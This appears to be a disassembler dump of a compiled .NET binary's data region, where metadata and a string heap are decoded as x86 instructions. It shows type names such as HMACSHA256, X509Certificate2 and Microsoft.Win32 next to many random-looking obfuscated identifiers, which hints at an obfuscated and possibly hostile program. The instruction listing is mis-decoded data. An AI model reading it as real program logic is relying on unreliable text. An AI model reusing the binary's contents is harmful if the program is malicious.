  4075bd:	06                   	push   %es
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 b2 23 a4 00 00    	add    %dh,0xa423(%edx)
  4075c7:	00 71 19             	add    %dh,0x19(%ecx)
  4075ca:	a9 00 00 00 ed       	test   $0xed000000,%eax
  4075cf:	03 ae 00 00 00 16    	add    0x16000000(%esi),%ebp
  4075d5:	06                   	push   %es
  4075d6:	ae                   	scas   %es:(%edi),%al
  4075d7:	00 00                	add    %al,(%eax)
  4075d9:	00 b3 09 b2 00 00    	add    %dh,0xb209(%ebx)
  4075df:	00 4e 17             	add    %cl,0x17(%esi)
  4075e2:	b7 00                	mov    $0x0,%bh
  4075e4:	00 00                	add    %al,(%eax)
  4075e6:	0e                   	push   %cs
  4075e7:	05 bb 00 00 00       	add    $0xbb,%eax
  4075ec:	ec                   	in     (%dx),%al
  4075ed:	1a b2 00 00 00 63    	sbb    0x63000000(%edx),%dh
  4075f3:	13 bf 00 00 00 b0    	adc    -0x50000000(%edi),%edi
  4075f9:	17                   	pop    %ss
  4075fa:	b7 00                	mov    $0x0,%bh
  4075fc:	00 00                	add    %al,(%eax)
  4075fe:	c9                   	leave
  4075ff:	17                   	pop    %ss
  407600:	c3                   	ret
  407601:	01 00                	add    %eax,(%eax)
  407603:	00 3b                	add    %bh,(%ebx)
  407605:	09 f8                	or     %edi,%eax
  407607:	01 00                	add    %eax,(%eax)
  407609:	00 6c 15 fe          	add    %ch,-0x2(%ebp,%edx,1)
  40760d:	01 00                	add    %eax,(%eax)
  40760f:	00 b9 07 69 02 00    	add    %bh,0x26907(%ecx)
  407615:	00 b7 24 6d 02 00    	add    %dh,0x26d24(%edi)
  40761b:	00 18                	add    %bl,(%eax)
  40761d:	18 71 02             	sbb    %dh,0x2(%ecx)
  407620:	00 00                	add    %al,(%eax)
  407622:	b0 14                	mov    $0x14,%al
  407624:	75 02                	jne    0x407628
  407626:	00 00                	add    %al,(%eax)
  407628:	91                   	xchg   %eax,%ecx
  407629:	04 7a                	add    $0x7a,%al
  40762b:	02 02                	add    (%edx),%al
  40762d:	00 06                	add    %al,(%esi)
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 77 17             	add    %dh,0x17(%edi)
  407706:	6a 17                	push   $0x17
  407708:	82 17 ef             	adcb   $0xef,(%edi)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	c5 24 01             	lds    (%ecx,%eax,1),%esp
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	f4                   	hlt
  407723:	23 01                	and    (%ecx),%eax
  407725:	00 00                	add    %al,(%eax)
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	17                   	pop    %ss
  40772b:	0e                   	push   %cs
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	f0 22 02             	lock and (%edx),%al
  407735:	00 40 01             	add    %al,0x1(%eax)
  407738:	79 00                	jns    0x40773a
  40773a:	0d 10 02 00 40       	or     $0x40000210,%eax
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	df 16                	fists  (%esi)
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	2b 00                	sub    (%eax),%eax
  407766:	00 00                	add    %al,(%eax)
  407768:	04 00                	add    $0x0,%al
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	4a                   	dec    %edx
  407777:	0a 00                	or     (%eax),%al
  407779:	00 00                	add    %al,(%eax)
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	95                   	xchg   %eax,%ebp
  40778b:	18 00                	sbb    %al,(%eax)
  40778d:	00 00                	add    %al,(%eax)
  40778f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 61 14             	add    %ah,0x14(%ecx)
  4077a0:	00 00                	add    %al,(%eax)
  4077a2:	00 00                	add    %al,(%eax)
  4077a4:	04 00                	add    $0x0,%al
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	cb                   	lret
  4077b3:	0f 00 00             	sldt   (%eax)
  4077b6:	00 00                	add    %al,(%eax)
  4077b8:	0a 00                	or     (%eax),%al
	...
  4077c2:	00 00                	add    %al,(%eax)
  4077c4:	cc                   	int3
  4077c5:	00 cc                	add    %cl,%ah
  4077c7:	0a 00                	or     (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 9c 22 00 00 00 00 	add    %bl,0x0(%edx,%eiz,1)
  4077e0:	04 00                	add    $0x0,%al
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	55                   	push   %ebp
  4077ef:	20 00                	and    %al,(%eax)
  4077f1:	00 00                	add    %al,(%eax)
  4077f3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 ae 1b 00 00 00    	add    %ch,0x1b(%esi)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 49 45             	add    %cl,0x45(%ecx)
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	75 6d                	jne    0x407899
  40782c:	65 72 61             	gs jb  0x407890
  40782f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407833:	31 00                	xor    %eax,(%eax)
  407835:	43                   	inc    %ebx
  407836:	61                   	popa
  407837:	6c                   	insb   (%dx),%es:(%edi)
  407838:	6c                   	insb   (%dx),%es:(%edi)
  407839:	53                   	push   %ebx
  40783a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407841:	69 
  407842:	73 74                	jae    0x4078b8
  407844:	60                   	pusha
  407845:	31 00                	xor    %eax,(%eax)
  407847:	43                   	inc    %ebx
  407848:	6c                   	insb   (%dx),%es:(%edi)
  407849:	69 65 6e 74 31 00 4d 	imul   $0x4d003174,0x6e(%ebp),%esp
  407850:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407857:	74 2e                	je     0x407887
  407859:	57                   	push   %edi
  40785a:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407861:	55                   	push   %ebp
  407862:	49                   	dec    %ecx
  407863:	6e                   	outsb  %ds:(%esi),(%dx)
  407864:	74 33                	je     0x407899
  407866:	32 00                	xor    (%eax),%al
  407868:	54                   	push   %esp
  407869:	6f                   	outsl  %ds:(%esi),(%dx)
  40786a:	49                   	dec    %ecx
  40786b:	6e                   	outsb  %ds:(%esi),(%dx)
  40786c:	74 33                	je     0x4078a1
  40786e:	32 00                	xor    (%eax),%al
  407870:	58                   	pop    %eax
  407871:	35 30 39 43 65       	xor    $0x65433930,%eax
  407876:	72 74                	jb     0x4078ec
  407878:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40787f:	32 00                	xor    (%eax),%al
  407881:	54                   	push   %esp
  407882:	6f                   	outsl  %ds:(%esi),(%dx)
  407883:	55                   	push   %ebp
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 36                	je     0x4078be
  407888:	34 00                	xor    $0x0,%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 36                	je     0x4078c6
  407890:	34 00                	xor    $0x0,%al
  407892:	54                   	push   %esp
  407893:	6f                   	outsl  %ds:(%esi),(%dx)
  407894:	55                   	push   %ebp
  407895:	49                   	dec    %ecx
  407896:	6e                   	outsb  %ds:(%esi),(%dx)
  407897:	74 31                	je     0x4078ca
  407899:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  40789e:	6e                   	outsb  %ds:(%esi),(%dx)
  40789f:	74 31                	je     0x4078d2
  4078a1:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  4078a5:	41                   	inc    %ecx
  4078a6:	43                   	inc    %ebx
  4078a7:	53                   	push   %ebx
  4078a8:	48                   	dec    %eax
  4078a9:	41                   	inc    %ecx
  4078aa:	32 35 36 00 67 65    	xor    0x65670036,%dh
  4078b0:	74 5f                	je     0x407911
  4078b2:	55                   	push   %ebp
  4078b3:	54                   	push   %esp
  4078b4:	46                   	inc    %esi
  4078b5:	38 00                	cmp    %al,(%eax)
  4078b7:	3c 4d                	cmp    $0x4d,%al
  4078b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ba:	64 75 6c             	fs jne 0x407929
  4078bd:	65 3e 00 63 4c       	gs add %ah,%ds:0x4c(%ebx)
  4078c2:	69 43 73 69 67 71 41 	imul   $0x41716769,0x73(%ebx),%eax
  4078c9:	74 47                	je     0x407912
  4078cb:	41                   	inc    %ecx
  4078cc:	00 48 67             	add    %cl,0x67(%eax)
  4078cf:	4b                   	dec    %ebx
  4078d0:	4a                   	dec    %edx
  4078d1:	75 4f                	jne    0x407922
  4078d3:	64 6c                	fs insb (%dx),%es:(%edi)
  4078d5:	43                   	inc    %ebx
  4078d6:	58                   	pop    %eax
  4078d7:	49                   	dec    %ecx
  4078d8:	72 6b                	jb     0x407945
  4078da:	50                   	push   %eax
  4078db:	65 41                	gs inc %ecx
  4078dd:	00 6b 78             	add    %ch,0x78(%ebx)
  4078e0:	68 61 71 4f 59       	push   $0x594f7161
  4078e5:	46                   	inc    %esi
  4078e6:	4c                   	dec    %esp
  4078e7:	50                   	push   %eax
  4078e8:	41                   	inc    %ecx
  4078e9:	41                   	inc    %ecx
  4078ea:	4b                   	dec    %ebx
  4078eb:	61                   	popa
  4078ec:	69 41 00 63 44 47 59 	imul   $0x59474463,0x0(%ecx),%eax
  4078f3:	75 54                	jne    0x407949
  4078f5:	70 50                	jo     0x407947
  4078f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f8:	76 71                	jbe    0x40796b
  4078fa:	47                   	inc    %edi
  4078fb:	70 58                	jo     0x407955
  4078fd:	72 41                	jb     0x407940
  4078ff:	00 73 44             	add    %dh,0x44(%ebx)
  407902:	63 6a 4c             	arpl   %ebp,0x4c(%edx)
  407905:	55                   	push   %ebp
  407906:	41                   	inc    %ecx
  407907:	6d                   	insl   (%dx),%es:(%edi)
  407908:	41                   	inc    %ecx
  407909:	5a                   	pop    %edx
  40790a:	68 52 73 65 45       	push   $0x45657352
  40790f:	73 41                	jae    0x407952
  407911:	00 65 55             	add    %ah,0x55(%ebp)
  407914:	48                   	dec    %eax
  407915:	5a                   	pop    %edx
  407916:	42                   	inc    %edx
  407917:	50                   	push   %eax
  407918:	66 68 42 57          	pushw  $0x5742
  40791c:	57                   	push   %edi
  40791d:	57                   	push   %edi
  40791e:	49                   	dec    %ecx
  40791f:	42                   	inc    %edx
  407920:	00 73 56             	add    %dh,0x56(%ebx)
  407923:	74 58                	je     0x40797d
  407925:	45                   	inc    %ebp
  407926:	75 62                	jne    0x40798a
  407928:	63 51 55             	arpl   %edx,0x55(%ecx)
  40792b:	42                   	inc    %edx
  40792c:	00 6a 77             	add    %ch,0x77(%edx)
  40792f:	77 7a                	ja     0x4079ab
  407931:	49                   	dec    %ecx
  407932:	43                   	inc    %ebx
  407933:	68 73 61 56 42       	push   $0x42566173
  407938:	00 41 4b             	add    %al,0x4b(%ecx)
  40793b:	77 6e                	ja     0x4079ab
  40793d:	70 79                	jo     0x4079b8
  40793f:	51                   	push   %ecx
  407940:	6f                   	outsl  %ds:(%esi),(%dx)
  407941:	69 43 5a 42 00 56 62 	imul   $0x62560042,0x5a(%ebx),%eax
  407948:	45                   	inc    %ebp
  407949:	4a                   	dec    %edx
  40794a:	63 79 53             	arpl   %edi,0x53(%ecx)
  40794d:	6e                   	outsb  %ds:(%esi),(%dx)
  40794e:	70 65                	jo     0x4079b5
  407950:	70 42                	jo     0x407994
  407952:	00 74 61 69          	add    %dh,0x69(%ecx,%eiz,2)
  407956:	6a 67                	push   $0x67
  407958:	78 73                	js     0x4079cd
  40795a:	53                   	push   %ebx
  40795b:	4d                   	dec    %ebp
  40795c:	77 42                	ja     0x4079a0
  40795e:	00 53 4d             	add    %dl,0x4d(%ebx)
  407961:	58                   	pop    %eax
  407962:	6e                   	outsb  %ds:(%esi),(%dx)
  407963:	71 4a                	jno    0x4079af
  407965:	43                   	inc    %ebx
  407966:	50                   	push   %eax
  407967:	41                   	inc    %ecx
  407968:	78 42                	js     0x4079ac
  40796a:	00 51 74             	add    %dl,0x74(%ecx)
  40796d:	48                   	dec    %eax
  40796e:	77 72                	ja     0x4079e2
  407970:	47                   	inc    %edi
  407971:	58                   	pop    %eax
  407972:	62 5a 76             	bound  %ebx,0x76(%edx)
  407975:	72 45                	jb     0x4079bc
  407977:	41                   	inc    %ecx
  407978:	7a 42                	jp     0x4079bc
  40797a:	00 47 43             	add    %al,0x43(%edi)
  40797d:	00 6d 7a             	add    %ch,0x7a(%ebp)
  407980:	59                   	pop    %ecx
  407981:	4c                   	dec    %esp
  407982:	47                   	inc    %edi
  407983:	57                   	push   %edi
  407984:	6a 6c                	push   $0x6c
  407986:	6a 43                	push   $0x43
  407988:	58                   	pop    %eax
  407989:	43                   	inc    %ebx
  40798a:	00 65 62             	add    %ah,0x62(%ebp)
  40798d:	6c                   	insb   (%dx),%es:(%edi)
  40798e:	79 69                	jns    0x4079f9
  407990:	66 79 75             	data16 jns 0x407a08
  407993:	68 63 43 00 72       	push   $0x72004363
  407998:	51                   	push   %ecx
  407999:	57                   	push   %edi
  40799a:	48                   	dec    %eax
  40799b:	48                   	dec    %eax
  40799c:	4a                   	dec    %edx
  40799d:	4b                   	dec    %ebx
  40799e:	47                   	inc    %edi
  40799f:	41                   	inc    %ecx
  4079a0:	6d                   	insl   (%dx),%es:(%edi)
  4079a1:	70 43                	jo     0x4079e6
  4079a3:	00 76 59             	add    %dh,0x59(%esi)
  4079a6:	65 52                	gs push %edx
  4079a8:	44                   	inc    %esp
  4079a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4079aa:	74 4a                	je     0x4079f6
  4079ac:	42                   	inc    %edx
  4079ad:	79 6e                	jns    0x407a1d
  4079af:	6a 58                	push   $0x58
  4079b1:	77 43                	ja     0x4079f6
  4079b3:	00 42 4a             	add    %al,0x4a(%edx)
  4079b6:	51                   	push   %ecx
  4079b7:	48                   	dec    %eax
  4079b8:	77 6f                	ja     0x407a29
  4079ba:	4b                   	dec    %ebx
  4079bb:	44                   	inc    %esp
  4079bc:	67 6e                	outsb  %ds:(%si),(%dx)
  4079be:	46                   	inc    %esi
  4079bf:	41                   	inc    %ecx
  4079c0:	44                   	inc    %esp
  4079c1:	00 56 6f             	add    %dl,0x6f(%esi)
  4079c4:	76 44                	jbe    0x407a0a
  4079c6:	50                   	push   %eax
  4079c7:	56                   	push   %esi
  4079c8:	78 6e                	js     0x407a38
  4079ca:	4f                   	dec    %edi
  4079cb:	45                   	inc    %ebp
  4079cc:	43                   	inc    %ebx
  4079cd:	44                   	inc    %esp
  4079ce:	00 4f 55             	add    %cl,0x55(%edi)
  4079d1:	5a                   	pop    %edx
  4079d2:	4a                   	dec    %edx
  4079d3:	4d                   	dec    %ebp
  4079d4:	4f                   	dec    %edi
  4079d5:	45                   	inc    %ebp
  4079d6:	43                   	inc    %ebx
  4079d7:	4a                   	dec    %edx
  4079d8:	4c                   	dec    %esp
  4079d9:	47                   	inc    %edi
  4079da:	44                   	inc    %esp
  4079db:	00 4d 61             	add    %cl,0x61(%ebp)
  4079de:	70 4e                	jo     0x407a2e
  4079e0:	61                   	popa
  4079e1:	6d                   	insl   (%dx),%es:(%edi)
  4079e2:	65 54                	gs push %esp
  4079e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e5:	4f                   	dec    %edi
  4079e6:	49                   	dec    %ecx
  4079e7:	44                   	inc    %esp
  4079e8:	00 67 65             	add    %ah,0x65(%edi)
  4079eb:	74 5f                	je     0x407a4c
  4079ed:	46                   	inc    %esi
  4079ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ef:	72 6d                	jb     0x407a5e
  4079f1:	61                   	popa
  4079f2:	74 49                	je     0x407a3d
  4079f4:	44                   	inc    %esp
  4079f5:	00 7a 56             	add    %bh,0x56(%edx)
  4079f8:	78 71                	js     0x407a6b
  4079fa:	6a 46                	push   $0x46
  4079fc:	45                   	inc    %ebp
  4079fd:	59                   	pop    %ecx
  4079fe:	42                   	inc    %edx
  4079ff:	63 44 00 63          	arpl   %eax,0x63(%eax,%eax,1)
  407a03:	6a 5a                	push   $0x5a
  407a05:	58                   	pop    %eax
  407a06:	66 48                	dec    %ax
  407a08:	69 56 75 66 44 00 73 	imul   $0x73004466,0x75(%esi),%edx
  407a0f:	68 4b 7a 6e 65       	push   $0x656e7a4b
  407a14:	49                   	dec    %ecx
  407a15:	52                   	push   %edx
  407a16:	6c                   	insb   (%dx),%es:(%edi)
  407a17:	44                   	inc    %esp
  407a18:	00 71 4f             	add    %dh,0x4f(%ecx)
  407a1b:	55                   	push   %ebp
  407a1c:	47                   	inc    %edi
  407a1d:	43                   	inc    %ebx
  407a1e:	44                   	inc    %esp
  407a1f:	50                   	push   %eax
  407a20:	71 47                	jno    0x407a69
  407a22:	6a 6a                	push   $0x6a
  407a24:	6d                   	insl   (%dx),%es:(%edi)
  407a25:	44                   	inc    %esp
  407a26:	00 6f 54             	add    %ch,0x54(%edi)
  407a29:	61                   	popa
  407a2a:	64 77 67             	fs ja  0x407a94
  407a2d:	7a 66                	jp     0x407a95
  407a2f:	6e                   	outsb  %ds:(%esi),(%dx)
  407a30:	41                   	inc    %ecx
  407a31:	70 44                	jo     0x407a77
  407a33:	00 47 7a             	add    %al,0x7a(%edi)
  407a36:	73 58                	jae    0x407a90
  407a38:	68 71 4f 6d 71       	push   $0x716d4f71
  407a3d:	66 44                	inc    %sp
  407a3f:	45                   	inc    %ebp
  407a40:	00 57 47             	add    %dl,0x47(%edi)
  407a43:	6b 64 46 68 51       	imul   $0x51,0x68(%esi,%eax,2),%esp
  407a48:	74 51                	je     0x407a9b
  407a4a:	45                   	inc    %ebp
  407a4b:	00 4a 51             	add    %cl,0x51(%edx)
  407a4e:	4a                   	dec    %edx
  407a4f:	6c                   	insb   (%dx),%es:(%edi)
  407a50:	75 44                	jne    0x407a96
  407a52:	78 47                	js     0x407a9b
  407a54:	56                   	push   %esi
  407a55:	57                   	push   %edi
  407a56:	62 45 00             	bound  %eax,0x0(%ebp)
  407a59:	42                   	inc    %edx
  407a5a:	69 4f 55 45 54 54 74 	imul   $0x74545445,0x55(%edi),%ecx
  407a61:	6c                   	insb   (%dx),%es:(%edi)
  407a62:	6e                   	outsb  %ds:(%esi),(%dx)
  407a63:	68 45 00 7a 76       	push   $0x767a0045
  407a68:	66 48                	dec    %ax
  407a6a:	65 4c                	gs dec %esp
  407a6c:	71 72                	jno    0x407ae0
  407a6e:	47                   	inc    %edi
  407a6f:	64 44                	fs inc %esp
  407a71:	44                   	inc    %esp
  407a72:	6f                   	outsl  %ds:(%esi),(%dx)
  407a73:	4d                   	dec    %ebp
  407a74:	46                   	inc    %esi
  407a75:	00 65 58             	add    %ah,0x58(%ebp)
  407a78:	62 46 71             	bound  %eax,0x71(%esi)
  407a7b:	41                   	inc    %ecx
  407a7c:	58                   	pop    %eax
  407a7d:	4b                   	dec    %ebx
  407a7e:	75 44                	jne    0x407ac4
  407a80:	45                   	inc    %ebp
  407a81:	51                   	push   %ecx
  407a82:	46                   	inc    %esi
  407a83:	00 43 6c             	add    %al,0x6c(%ebx)
  407a86:	63 6b 64             	arpl   %ebp,0x64(%ebx)
  407a89:	72 48                	jb     0x407ad3
  407a8b:	6f                   	outsl  %ds:(%esi),(%dx)
  407a8c:	68 4e 77 41 70       	push   $0x7041774e
  407a91:	64 46                	fs inc %esi
  407a93:	00 65 64             	add    %ah,0x64(%ebp)
  407a96:	56                   	push   %esi
  407a97:	77 6a                	ja     0x407b03
  407a99:	49                   	dec    %ecx
  407a9a:	57                   	push   %edi
  407a9b:	45                   	inc    %ebp
  407a9c:	6d                   	insl   (%dx),%es:(%edi)
  407a9d:	4b                   	dec    %ebx
  407a9e:	65 67 46             	gs addr16 inc %esi
  407aa1:	00 62 4c             	add    %ah,0x4c(%edx)
  407aa4:	6b 4d 6a 55          	imul   $0x55,0x6a(%ebp),%ecx
  407aa8:	5a                   	pop    %edx
  407aa9:	52                   	push   %edx
  407aaa:	59                   	pop    %ecx
  407aab:	6b 64 6d 46 00       	imul   $0x0,0x46(%ebp,%ebp,2),%esp
  407ab0:	47                   	inc    %edi
  407ab1:	58                   	pop    %eax
  407ab2:	55                   	push   %ebp
  407ab3:	4e                   	dec    %esi
  407ab4:	4e                   	dec    %esi
  407ab5:	79 6e                	jns    0x407b25
  407ab7:	64 49                	fs dec %ecx
  407ab9:	4f                   	dec    %edi
  407aba:	78 43                	js     0x407aff
  407abc:	47                   	inc    %edi
  407abd:	00 67 56             	add    %ah,0x56(%edi)
  407ac0:	59                   	pop    %ecx
  407ac1:	4d                   	dec    %ebp
  407ac2:	4a                   	dec    %edx
  407ac3:	51                   	push   %ecx
  407ac4:	56                   	push   %esi
  407ac5:	51                   	push   %ecx
  407ac6:	64 70 58             	fs jo  0x407b21
  407ac9:	44                   	inc    %esp
  407aca:	47                   	inc    %edi
  407acb:	00 75 44             	add    %dh,0x44(%ebp)
  407ace:	68 59 61 6e 6c       	push   $0x6c6e6159
  407ad3:	69 48 78 4e 47 00 47 	imul   $0x4700474e,0x78(%eax),%ecx
  407ada:	61                   	popa
  407adb:	51                   	push   %ecx
  407adc:	77 4d                	ja     0x407b2b
  407ade:	63 57 79             	arpl   %edx,0x79(%edi)
  407ae1:	51                   	push   %ecx
  407ae2:	47                   	inc    %edi
  407ae3:	00 6a 4a             	add    %ch,0x4a(%edx)
  407ae6:	6f                   	outsl  %ds:(%esi),(%dx)
  407ae7:	74 66                	je     0x407b4f
  407ae9:	50                   	push   %eax
  407aea:	6e                   	outsb  %ds:(%esi),(%dx)
  407aeb:	5a                   	pop    %edx
  407aec:	47                   	inc    %edi
  407aed:	63 54 47 00          	arpl   %edx,0x0(%edi,%eax,2)
  407af1:	5a                   	pop    %edx
  407af2:	61                   	popa
  407af3:	4f                   	dec    %edi
  407af4:	79 43                	jns    0x407b39
  407af6:	79 50                	jns    0x407b48
  407af8:	69 69 76 68 58 47 00 	imul   $0x475868,0x76(%ecx),%ebp
  407aff:	54                   	push   %esp
  407b00:	61                   	popa
  407b01:	46                   	inc    %esi
  407b02:	79 6e                	jns    0x407b72
  407b04:	76 6b                	jbe    0x407b71
  407b06:	75 4d                	jne    0x407b55
  407b08:	45                   	inc    %ebp
  407b09:	6e                   	outsb  %ds:(%esi),(%dx)
  407b0a:	45                   	inc    %ebp
  407b0b:	43                   	inc    %ebx
  407b0c:	62 47 00             	bound  %eax,0x0(%edi)
  407b0f:	4a                   	dec    %edx
  407b10:	56                   	push   %esi
  407b11:	70 76                	jo     0x407b89
  407b13:	6e                   	outsb  %ds:(%esi),(%dx)
  407b14:	55                   	push   %ebp
  407b15:	4a                   	dec    %edx
  407b16:	47                   	inc    %edi
  407b17:	4a                   	dec    %edx
  407b18:	63 47 00             	arpl   %eax,0x0(%edi)
  407b1b:	65 61                	gs popa
  407b1d:	4a                   	dec    %edx
  407b1e:	66 69 6b 42 79 4c    	imul   $0x4c79,0x42(%ebx),%bp
  407b24:	48                   	dec    %eax
  407b25:	48                   	dec    %eax
  407b26:	00 6c 6f 6a          	add    %ch,0x6a(%edi,%ebp,2)
  407b2a:	51                   	push   %ecx
  407b2b:	6a 6f                	push   $0x6f
  407b2d:	54                   	push   %esp
  407b2e:	75 75                	jne    0x407ba5
  407b30:	48                   	dec    %eax
  407b31:	48                   	dec    %eax
  407b32:	00 71 71             	add    %dh,0x71(%ecx)
  407b35:	47                   	inc    %edi
